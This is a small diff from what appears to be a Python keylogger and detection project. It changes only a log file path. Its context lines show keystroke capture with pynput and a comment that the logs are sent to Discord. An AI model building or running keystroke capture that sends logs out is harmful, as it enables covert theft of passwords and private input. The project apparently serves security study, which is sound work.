@@ -5,7 +5,7 @@ from pynput import keyboard
 from dotenv import load_dotenv
 
 # key logging variables including file path to log file
-log_file = "Python/Projects/Keylogger-and-Detection-Script/key_presses.txt"
+log_file = "Keylogger-and-Detection-Script/key_presses.txt"
 keys_pressed = "" 
 
 # this loads and sends the logs to discord
